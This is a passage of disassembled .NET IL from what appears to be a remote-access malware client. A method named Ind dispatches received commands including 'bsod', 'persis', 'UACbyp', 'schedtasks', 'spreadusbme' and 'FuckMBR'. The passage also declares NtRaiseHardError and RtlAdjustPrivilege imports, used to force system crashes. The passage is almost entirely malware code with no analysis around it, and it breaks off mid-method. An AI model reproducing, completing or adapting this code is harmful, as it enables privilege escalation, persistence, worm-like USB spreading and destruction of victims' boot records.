    IL_0280:  ldc.i4.1
    IL_0281:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0286:  pop
    IL_0287:  ldloc.s    V_5
    IL_0289:  ldc.i4.0
    IL_028a:  ldelem.u1
    IL_028b:  brfalse.s  IL_02ac

    IL_028d:  ldloc.s    V_4
    IL_028f:  ldc.i4.0
    IL_0290:  ldelem.ref
    IL_0291:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0296:  ldtoken    uint8[]
    IL_029b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02a5:  castclass  uint8[]
    IL_02aa:  stloc.s    V_10
    IL_02ac:  ldloc.s    V_5
    IL_02ae:  ldc.i4.2
    IL_02af:  ldelem.u1
    IL_02b0:  brfalse.s  IL_02d1

    IL_02b2:  ldloc.s    V_4
    IL_02b4:  ldc.i4.2
    IL_02b5:  ldelem.ref
    IL_02b6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_02bb:  ldtoken    [mscorlib]System.Int32
    IL_02c0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02ca:  unbox.any  [mscorlib]System.Int32
    IL_02cf:  stloc.s    V_9
    IL_02d1:  ldloc.s    V_7
    IL_02d3:  ldnull
    IL_02d4:  ldstr      "Dispose"
    IL_02d9:  ldc.i4.0
    IL_02da:  newarr     [mscorlib]System.Object
    IL_02df:  ldnull
    IL_02e0:  ldnull
    IL_02e1:  ldnull
    IL_02e2:  ldc.i4.1
    IL_02e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_02e8:  pop
    IL_02e9:  ldloc.s    V_6
    IL_02eb:  ldnull
    IL_02ec:  ldstr      "Dispose"
    IL_02f1:  ldc.i4.0
    IL_02f2:  newarr     [mscorlib]System.Object
    IL_02f7:  ldnull
    IL_02f8:  ldnull
    IL_02f9:  ldnull
    IL_02fa:  ldc.i4.1
    IL_02fb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0300:  pop
    IL_0301:  ldloc.s    V_10
    IL_0303:  stloc.0
    IL_0304:  ldloc.0
    IL_0305:  ret
  } // end of method OK::ZIP

  .method private static pinvokeimpl("user32" autochar lasterr winapi) 
          int32  FindWindowEx(int32 parentHandle,
                              int32 childAfter,
                              string& lclassName,
                              string& windowTitle) cil managed preservesig
  {
  }
  .method public static object  GETP(string StrP) cil managed
  {
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "%Current%"
    IL_0006:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_000b:  brfalse.s  IL_0023

    IL_000d:  ldarg.0
    IL_000e:  ldstr      "%Current%"
    IL_0013:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0018:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
    IL_001d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0022:  ret

    IL_0023:  ldarg.0
    IL_0024:  call       string [mscorlib]System.Environment::ExpandEnvironmentVariables(string)
    IL_0029:  ret
  } // end of method OK::GETP

  .method public static pinvokeimpl("user32.dll" winapi) 
          bool  PostMessageW(native int hWnd,
                             uint32 Msg,
                             int32 wParam,
                             int32 lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("ntdll.dll" winapi) 
          uint32  NtRaiseHardError(uint32 ErrorStatus,
                                   uint32 NumberOfParameters,
                                   uint32 UnicodeStringParameterMask,
                                   native int Parameters,
                                   uint32 ValidResponseOption,
                                   [out] uint32& Response) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("ntdll.dll" winapi) 
          uint32  RtlAdjustPrivilege(int32 Privilege,
                                     bool bEnablePrivilege,
                                     bool IsThreadPrivilege,
                                     [out] bool& PreviousValue) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       10021 (0x2725)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             string[] V_3,
             class [System]System.Net.WebClient V_4,
             string V_5,
             uint8[] V_6,
             class [System]System.Net.WebClient V_7,
             string V_8,
             uint32 V_9,
             bool V_10,
             uint32 V_11,
             string V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             native int V_18,
             int32 V_19,
             int32 V_20,
             valuetype [System.Drawing]System.Drawing.Rectangle V_21,
             native int V_22,
             int32 V_23,
             int32 V_24,
             native int V_25,
             int32 V_26,
             int32 V_27,
             native int V_28,
             int32 V_29,
             int32 V_30,
             native int V_31,
             int32 V_32,
             int32 V_33,
             native int V_34,
             int32 V_35,
             int32 V_36,
             class [mscorlib]System.Exception V_37,
             int32 V_38,
             int32 V_39,
             native int V_40,
             native int V_41,
             native int V_42,
             int32 V_43,
             int32 V_44,
             class [mscorlib]System.Random V_45,
             int32 V_46,
             class [System.Drawing]System.Drawing.Icon V_47,
             int32 V_48,
             int32 V_49,
             int32 V_50,
             int32 V_51,
             int32 V_52,
             native int V_53,
             native int V_54,
             int32 V_55,
             int32 V_56,
             class [System.Drawing]System.Drawing.Pen V_57,
             class [System.Drawing]System.Drawing.Graphics V_58,
             class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> V_59,
             class [mscorlib]System.Random V_60,
             int32 V_61,
             valuetype [System.Drawing]System.Drawing.Color V_62,
             int32 V_63,
             int32 V_64,
             int32 V_65,
             int32 V_66,
             valuetype [System.Drawing]System.Drawing.Point V_67,
             valuetype [System.Drawing]System.Drawing.Point V_68,
             native int V_69,
             native int V_70,
             int32 V_71,
             int32 V_72,
             class [mscorlib]System.Random V_73,
             int32 V_74,
             class [System.Drawing]System.Drawing.Icon V_75,
             int32 V_76,
             int32 V_77,
             int32 V_78,
             int32 V_79,
             int32 V_80,
             native int V_81,
             native int V_82,
             valuetype [System.Drawing]System.Drawing.Rectangle V_83,
             valuetype [System.Drawing]System.Drawing.Color V_84,
             valuetype [System.Drawing]System.Drawing.Color V_85,
             valuetype [System.Drawing]System.Drawing.Color V_86,
             valuetype [System.Drawing]System.Drawing.Color V_87,
             class [System.Drawing]System.Drawing.SolidBrush V_88,
             int32 V_89,
             int32 V_90,
             int32 V_91,
             int32 V_92,
             valuetype [System.Drawing]System.Drawing.Rectangle V_93,
             class [System.Drawing]System.Drawing.SolidBrush V_94,
             int32 V_95,
             int32 V_96,
             int32 V_97,
             int32 V_98,
             int32 V_99,
             int32 V_100,
             valuetype [System.Drawing]System.Drawing.Rectangle V_101,
             valuetype [System.Drawing]System.Drawing.Rectangle V_102,
             class [System.Drawing]System.Drawing.SolidBrush V_103,
             int32 V_104,
             int32 V_105,
             int32 V_106,
             int32 V_107,
             int32 V_108,
             int32 V_109,
             valuetype [System.Drawing]System.Drawing.Rectangle V_110,
             valuetype [System.Drawing]System.Drawing.Rectangle V_111,
             class [System.Drawing]System.Drawing.SolidBrush V_112,
             int32 V_113,
             int32 V_114,
             int32 V_115,
             int32 V_116,
             class [System.Drawing]System.Drawing.Drawing2D.GraphicsPath V_117,
             native int V_118,
             native int V_119,
             int32 V_120,
             int32 V_121,
             valuetype [System.Drawing]System.Drawing.Color[] V_122,
             class [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush V_123,
             class [System.Drawing]System.Drawing.Drawing2D.ColorBlend V_124,
             float32[] V_125,
             int32 V_126,
             int32 V_127,
             uint8[] V_128,
             string V_129,
             bool V_130,
             class [mscorlib]System.Exception V_131,
             uint8[] V_132,
             string V_133,
             class [mscorlib]System.Exception V_134,
             uint8[] V_135,
             class [mscorlib]System.Exception V_136,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_137,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_138,
             string V_139,
             string V_140,
             string V_141,
             int32 V_142,
             class [mscorlib]System.Exception V_143,
             class [mscorlib]System.Exception V_144,
             valuetype [mscorlib]System.Guid V_145,
             class [mscorlib]System.Exception V_146,
             class [mscorlib]System.Exception V_147,
             uint8[] V_148,
             object V_149,
             class [mscorlib]System.IO.MemoryStream V_150,
             int32 V_151,
             uint8[] V_152,
             object V_153,
             int32 V_154,
             string V_155,
             valuetype [System.Drawing]System.Drawing.Rectangle V_156,
             class [System.Drawing]System.Drawing.Bitmap V_157,
             class [System.Drawing]System.Drawing.Graphics V_158,
             valuetype [System.Drawing]System.Drawing.Size V_159,
             class [System.Drawing]System.Drawing.Bitmap V_160,
             class [mscorlib]System.IO.MemoryStream V_161,
             class [mscorlib]System.IO.MemoryStream V_162,
             string V_163,
             class [mscorlib]System.Exception V_164,
             int32 V_165,
             class [mscorlib]System.Exception V_166,
             class [mscorlib]System.Exception V_167,
             class [mscorlib]System.Exception V_168,
             class [mscorlib]System.Exception V_169,
             object[] V_170,
             bool[] V_171,
             int32 V_172,
             int32 V_173,
             class [mscorlib]System.Exception V_174,
             class [mscorlib]System.Exception V_175,
             class [mscorlib]System.Exception V_176)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldarga.s   b
      IL_001a:  call       string j.OK::BS(uint8[]&)
      IL_001f:  ldsfld     string j.OK::Y
      IL_0024:  ldc.i4.m1
      IL_0025:  ldc.i4.0
      IL_0026:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_002b:  stloc.3
      IL_002c:  ldloc.2
      IL_002d:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_0032:  stloc.s    V_9
      IL_0034:  ldloc.s    V_9
      IL_0036:  ldc.i4     0x8a3461c8
      IL_003b:  bgt.un     IL_0218

      IL_0040:  ldloc.s    V_9
      IL_0042:  ldc.i4     0x38276e70
      IL_0047:  bgt.un     IL_0125

      IL_004c:  ldloc.s    V_9
      IL_004e:  ldc.i4     0x2140aabe
      IL_0053:  bgt.un.s   IL_00b0

      IL_0055:  ldloc.s    V_9
      IL_0057:  ldc.i4     0x17722b8c
      IL_005c:  bgt.un.s   IL_0087

      IL_005e:  ldloc.s    V_9
      IL_0060:  ldc.i4     0x10fe67e
      IL_0065:  beq        IL_0787

      IL_006a:  ldloc.s    V_9
      IL_006c:  ldc.i4     0x4680447
      IL_0071:  beq        IL_0417

      IL_0076:  ldloc.s    V_9
      IL_0078:  ldc.i4     0x17722b8c
      IL_007d:  beq        IL_0653

      IL_0082:  br         IL_1b66

      IL_0087:  ldloc.s    V_9
      IL_0089:  ldc.i4     0x1bc44e86
      IL_008e:  beq        IL_0443

      IL_0093:  ldloc.s    V_9
      IL_0095:  ldc.i4     0x1e743595
      IL_009a:  beq        IL_04c7

      IL_009f:  ldloc.s    V_9
      IL_00a1:  ldc.i4     0x2140aabe
      IL_00a6:  beq        IL_067f

      IL_00ab:  br         IL_1b66

      IL_00b0:  ldloc.s    V_9
      IL_00b2:  ldc.i4     0x2b6ce2a9
      IL_00b7:  bgt.un.s   IL_00e2

      IL_00b9:  ldloc.s    V_9
      IL_00bb:  ldc.i4     0x234f382e
      IL_00c0:  beq        IL_063d

      IL_00c5:  ldloc.s    V_9
      IL_00c7:  ldc.i4     0x272dda4c
      IL_00cc:  beq        IL_042d

      IL_00d1:  ldloc.s    V_9
      IL_00d3:  ldc.i4     0x2b6ce2a9
      IL_00d8:  beq        IL_05a3

      IL_00dd:  br         IL_1b66

      IL_00e2:  ldloc.s    V_9
      IL_00e4:  ldc.i4     0x2fc941c2
      IL_00e9:  bgt.un.s   IL_0108

      IL_00eb:  ldloc.s    V_9
      IL_00ed:  ldc.i4     0x2daef55a
      IL_00f2:  beq        IL_0821

      IL_00f7:  ldloc.s    V_9
      IL_00f9:  ldc.i4     0x2fc941c2
      IL_00fe:  beq        IL_0509

      IL_0103:  br         IL_1b66

      IL_0108:  ldloc.s    V_9
      IL_010a:  ldc.i4     0x34dc6912
      IL_010f:  beq        IL_07b3

      IL_0114:  ldloc.s    V_9
      IL_0116:  ldc.i4     0x38276e70
      IL_011b:  beq        IL_06c1

      IL_0120:  br         IL_1b66

      IL_0125:  ldloc.s    V_9
      IL_0127:  ldc.i4     0x4b297fa4
      IL_012c:  bgt.un.s   IL_01a3

      IL_012e:  ldloc.s    V_9
      IL_0130:  ldc.i4     0x3b036886
      IL_0135:  bgt.un.s   IL_0160

      IL_0137:  ldloc.s    V_9
      IL_0139:  ldc.i4     0x384ef06a
      IL_013e:  beq        IL_0459

      IL_0143:  ldloc.s    V_9
      IL_0145:  ldc.i4     0x385f8569
      IL_014a:  beq        IL_046f

      IL_014f:  ldloc.s    V_9
      IL_0151:  ldc.i4     0x3b036886
      IL_0156:  beq        IL_04f3

      IL_015b:  br         IL_1b66

      IL_0160:  ldloc.s    V_9
      IL_0162:  ldc.i4     0x433cfaf2
      IL_0167:  bgt.un.s   IL_0186

      IL_0169:  ldloc.s    V_9
      IL_016b:  ldc.i4     0x3e514fbe
      IL_0170:  beq        IL_07c9

      IL_0175:  ldloc.s    V_9
      IL_0177:  ldc.i4     0x433cfaf2
      IL_017c:  beq        IL_0863

      IL_0181:  br         IL_1b66

      IL_0186:  ldloc.s    V_9
      IL_0188:  ldc.i4     0x4531c525
      IL_018d:  beq        IL_084d

      IL_0192:  ldloc.s    V_9
      IL_0194:  ldc.i4     0x4b297fa4
      IL_0199:  beq        IL_07f5

      IL_019e:  br         IL_1b66

      IL_01a3:  ldloc.s    V_9
      IL_01a5:  ldc.i4     0x574ccdbe
      IL_01aa:  bgt.un.s   IL_01d5

      IL_01ac:  ldloc.s    V_9
      IL_01ae:  ldc.i4     0x523408ab
      IL_01b3:  beq        IL_05e5

      IL_01b8:  ldloc.s    V_9
      IL_01ba:  ldc.i4     0x52bc2c44
      IL_01bf:  beq        IL_06ed

      IL_01c4:  ldloc.s    V_9
      IL_01c6:  ldc.i4     0x574ccdbe
      IL_01cb:  beq        IL_080b

      IL_01d0:  br         IL_1b66

      IL_01d5:  ldloc.s    V_9
      IL_01d7:  ldc.i4     0x79fa82c1
      IL_01dc:  bgt.un.s   IL_01fb

      IL_01de:  ldloc.s    V_9
      IL_01e0:  ldc.i4     0x77651492
      IL_01e5:  beq        IL_0561

      IL_01ea:  ldloc.s    V_9
      IL_01ec:  ldc.i4     0x79fa82c1
      IL_01f1:  beq        IL_051f

      IL_01f6:  br         IL_1b66

      IL_01fb:  ldloc.s    V_9
      IL_01fd:  ldc.i4     0x7a5d43c2
      IL_0202:  beq        IL_049b

      IL_0207:  ldloc.s    V_9
      IL_0209:  ldc.i4     0x8a3461c8
      IL_020e:  beq        IL_0627

      IL_0213:  br         IL_1b66

      IL_0218:  ldloc.s    V_9
      IL_021a:  ldc.i4     0xd19b1fdb
      IL_021f:  bgt.un     IL_02fd

      IL_0224:  ldloc.s    V_9
      IL_0226:  ldc.i4     0xaa5bd645
      IL_022b:  bgt.un.s   IL_0288

      IL_022d:  ldloc.s    V_9
      IL_022f:  ldc.i4     0x9dd9ccb2
      IL_0234:  bgt.un.s   IL_025f

      IL_0236:  ldloc.s    V_9
      IL_0238:  ldc.i4     0x9a3b1de4
      IL_023d:  beq        IL_05b9

      IL_0242:  ldloc.s    V_9
      IL_0244:  ldc.i4     0x9cf0b2a5
      IL_0249:  beq        IL_0611

      IL_024e:  ldloc.s    V_9
      IL_0250:  ldc.i4     0x9dd9ccb2
      IL_0255:  beq        IL_0485

      IL_025a:  br         IL_1b66

      IL_025f:  ldloc.s    V_9
      IL_0261:  ldc.i4     0x9f0a2c69
      IL_0266:  beq        IL_04dd

      IL_026b:  ldloc.s    V_9
      IL_026d:  ldc.i4     0xa8db785e
      IL_0272:  beq        IL_0771

      IL_0277:  ldloc.s    V_9
      IL_0279:  ldc.i4     0xaa5bd645
      IL_027e:  beq        IL_06d7

      IL_0283:  br         IL_1b66

      IL_0288:  ldloc.s    V_9
      IL_028a:  ldc.i4     0xb94c4a37
      IL_028f:  bgt.un.s   IL_02ba

      IL_0291:  ldloc.s    V_9
      IL_0293:  ldc.i4     0xac9ac23e
      IL_0298:  beq        IL_0703

      IL_029d:  ldloc.s    V_9
      IL_029f:  ldc.i4     0xb949e5e4
      IL_02a4:  beq        IL_0669

      IL_02a9:  ldloc.s    V_9
      IL_02ab:  ldc.i4     0xb94c4a37
      IL_02b0:  beq        IL_075b

      IL_02b5:  br         IL_1b66

      IL_02ba:  ldloc.s    V_9
      IL_02bc:  ldc.i4     0xc30a0384
      IL_02c1:  bgt.un.s   IL_02e0

      IL_02c3:  ldloc.s    V_9
      IL_02c5:  ldc.i4     0xbf6b5498
      IL_02ca:  beq        IL_054b

      IL_02cf:  ldloc.s    V_9
      IL_02d1:  ldc.i4     0xc30a0384
      IL_02d6:  beq        IL_05fb

      IL_02db:  br         IL_1b66

      IL_02e0:  ldloc.s    V_9
      IL_02e2:  ldc.i4     0xd009b61f
      IL_02e7:  beq        IL_058d

      IL_02ec:  ldloc.s    V_9
      IL_02ee:  ldc.i4     0xd19b1fdb
      IL_02f3:  beq        IL_0719

      IL_02f8:  br         IL_1b66

      IL_02fd:  ldloc.s    V_9
      IL_02ff:  ldc.i4     0xef3e349a
      IL_0304:  bgt.un.s   IL_037b

      IL_0306:  ldloc.s    V_9
      IL_0308:  ldc.i4     0xdeb88809
      IL_030d:  bgt.un.s   IL_0338

      IL_030f:  ldloc.s    V_9
      IL_0311:  ldc.i4     0xd5a43d84
      IL_0316:  beq        IL_0695

      IL_031b:  ldloc.s    V_9
      IL_031d:  ldc.i4     0xd82ddf1e
      IL_0322:  beq        IL_079d

      IL_0327:  ldloc.s    V_9
      IL_0329:  ldc.i4     0xdeb88809
      IL_032e:  beq        IL_06ab

      IL_0333:  br         IL_1b66

      IL_0338:  ldloc.s    V_9
      IL_033a:  ldc.i4     0xe1e4263c
      IL_033f:  bgt.un.s   IL_035e

      IL_0341:  ldloc.s    V_9
      IL_0343:  ldc.i4     0xe09dd725
      IL_0348:  beq        IL_0401

      IL_034d:  ldloc.s    V_9
      IL_034f:  ldc.i4     0xe1e4263c
      IL_0354:  beq        IL_05cf

      IL_0359:  br         IL_1b66

      IL_035e:  ldloc.s    V_9
      IL_0360:  ldc.i4     0xe981ed0f
      IL_0365:  beq        IL_07df

      IL_036a:  ldloc.s    V_9
      IL_036c:  ldc.i4     0xef3e349a
      IL_0371:  beq        IL_0879

      IL_0376:  br         IL_1b66

      IL_037b:  ldloc.s    V_9
      IL_037d:  ldc.i4     0xf790b4a9
      IL_0382:  bgt.un.s   IL_03ad

      IL_0384:  ldloc.s    V_9
      IL_0386:  ldc.i4     0xf38d9cf1
      IL_038b:  beq        IL_0745

      IL_0390:  ldloc.s    V_9
      IL_0392:  ldc.i4     0xf66da4f9
      IL_0397:  beq        IL_072f

      IL_039c:  ldloc.s    V_9
      IL_039e:  ldc.i4     0xf790b4a9
      IL_03a3:  beq        IL_0837

      IL_03a8:  br         IL_1b66

      IL_03ad:  ldloc.s    V_9
      IL_03af:  ldc.i4     0xf9206bde
      IL_03b4:  bgt.un.s   IL_03d3

      IL_03b6:  ldloc.s    V_9
      IL_03b8:  ldc.i4     0xf8258d3b
      IL_03bd:  beq        IL_0577

      IL_03c2:  ldloc.s    V_9
      IL_03c4:  ldc.i4     0xf9206bde
      IL_03c9:  beq        IL_04b1

      IL_03ce:  br         IL_1b66

      IL_03d3:  ldloc.s    V_9
      IL_03d5:  ldc.i4     0xf967d5e7
      IL_03da:  beq        IL_0535

      IL_03df:  ldloc.s    V_9
      IL_03e1:  ldc.i4     0xfb9ff8a9
      IL_03e6:  bne.un     IL_1b66

      IL_03eb:  ldloc.2
      IL_03ec:  ldstr      "bsod"
      IL_03f1:  ldc.i4.0
      IL_03f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f7:  brfalse    IL_088f

      IL_03fc:  br         IL_1b66

      IL_0401:  ldloc.2
      IL_0402:  ldstr      "persis"
      IL_0407:  ldc.i4.0
      IL_0408:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_040d:  brfalse    IL_08b5

      IL_0412:  br         IL_1b66

      IL_0417:  ldloc.2
      IL_0418:  ldstr      "UACbyp"
      IL_041d:  ldc.i4.0
      IL_041e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0423:  brfalse    IL_08bf

      IL_0428:  br         IL_1b66

      IL_042d:  ldloc.2
      IL_042e:  ldstr      "checkin"
      IL_0433:  ldc.i4.0
      IL_0434:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0439:  brfalse    IL_094e

      IL_043e:  br         IL_1b66

      IL_0443:  ldloc.2
      IL_0444:  ldstr      "Runas"
      IL_0449:  ldc.i4.0
      IL_044a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_044f:  brfalse    IL_09c6

      IL_0454:  br         IL_1b66

      IL_0459:  ldloc.2
      IL_045a:  ldstr      "schedtasks"
      IL_045f:  ldc.i4.0
      IL_0460:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0465:  brfalse    IL_0a20

      IL_046a:  br         IL_1b66

      IL_046f:  ldloc.2
      IL_0470:  ldstr      "unschedtasks"
      IL_0475:  ldc.i4.0
      IL_0476:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_047b:  brfalse    IL_0a6f

      IL_0480:  br         IL_1b66

      IL_0485:  ldloc.2
      IL_0486:  ldstr      "spreadusbme"
      IL_048b:  ldc.i4.0
      IL_048c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0491:  brfalse    IL_0a95

      IL_0496:  br         IL_1b66

      IL_049b:  ldloc.2
      IL_049c:  ldstr      "restartme"
      IL_04a1:  ldc.i4.0
      IL_04a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a7:  brfalse    IL_0a9f

      IL_04ac:  br         IL_1b66

      IL_04b1:  ldloc.2
      IL_04b2:  ldstr      "shutdowm"
      IL_04b7:  ldc.i4.0
      IL_04b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04bd:  brfalse    IL_0ab2

      IL_04c2:  br         IL_1b66

      IL_04c7:  ldloc.2
      IL_04c8:  ldstr      "FuckMBR"
      IL_04cd:  ldc.i4.0
      IL_04ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d3:  brfalse    IL_0ac5

      IL_04d8:  br         IL_1b66

      IL_04dd:  ldloc.2
      IL_04de:  ldstr      "FuckMBRNR"
      IL_04e3:  ldc.i4.0
      IL_04e4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e9:  brfalse    IL_0b54

      IL_04ee:  br         IL_1b66

      IL_04f3:  ldloc.2
      IL_04f4:  ldstr      "Flip"
      IL_04f9:  ldc.i4.0
      IL_04fa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04ff:  brfalse    IL_0bd1

      IL_0504:  br         IL_1b66

      IL_0509:  ldloc.2
      IL_050a:  ldstr      "mirror"
      IL_050f:  ldc.i4.0
      IL_0510:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0515:  brfalse    IL_0c2a

      IL_051a:  br         IL_1b66

      IL_051f:  ldloc.2
      IL_0520:  ldstr      "Invert"
      IL_0525:  ldc.i4.0
      IL_0526:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_052b:  brfalse    IL_0c83

      IL_0530:  br         IL_1b66

      IL_0535:  ldloc.2
      IL_0536:  ldstr      "Flashbang"
      IL_053b:  ldc.i4.0
      IL_053c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0541:  brfalse    IL_0cd9

      IL_0546:  br         IL_1b66

      IL_054b:  ldloc.2
      IL_054c:  ldstr      "LightsOut"
      IL_0551:  ldc.i4.0
      IL_0552:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0557:  brfalse    IL_0d2f

      IL_055c:  br         IL_1b66

      IL_0561:  ldloc.2
      IL_0562:  ldstr      "boing"
      IL_0567:  ldc.i4.0
      IL_0568:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_056d:  brfalse    IL_0d82

      IL_0572:  br         IL_1b66

      IL_0577:  ldloc.2
      IL_0578:  ldstr      "lockon"
      IL_057d:  ldc.i4.0
      IL_057e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0583:  brfalse    IL_0de0

      IL_0588:  br         IL_1b66

      IL_058d:  ldloc.2
      IL_058e:  ldstr      "lockoff"
      IL_0593:  ldc.i4.0
      IL_0594:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0599:  brfalse    IL_0e3f

      IL_059e:  br         IL_1b66

      IL_05a3:  ldloc.2
      IL_05a4:  ldstr      "rainbow"
      IL_05a9:  ldc.i4.0
      IL_05aa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05af:  brfalse    IL_0e87

      IL_05b4:  br         IL_1b66

      IL_05b9:  ldloc.2
      IL_05ba:  ldstr      "sysicos"
      IL_05bf:  ldc.i4.0
      IL_05c0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05c5:  brfalse    IL_0efa

      IL_05ca:  br         IL_1b66

      IL_05cf:  ldloc.2
      IL_05d0:  ldstr      "lines"
      IL_05d5:  ldc.i4.0
      IL_05d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05db:  brfalse    IL_1001

      IL_05e0:  br         IL_1b66

      IL_05e5:  ldloc.2
      IL_05e6:  ldstr      "icocrazy"
      IL_05eb:  ldc.i4.0
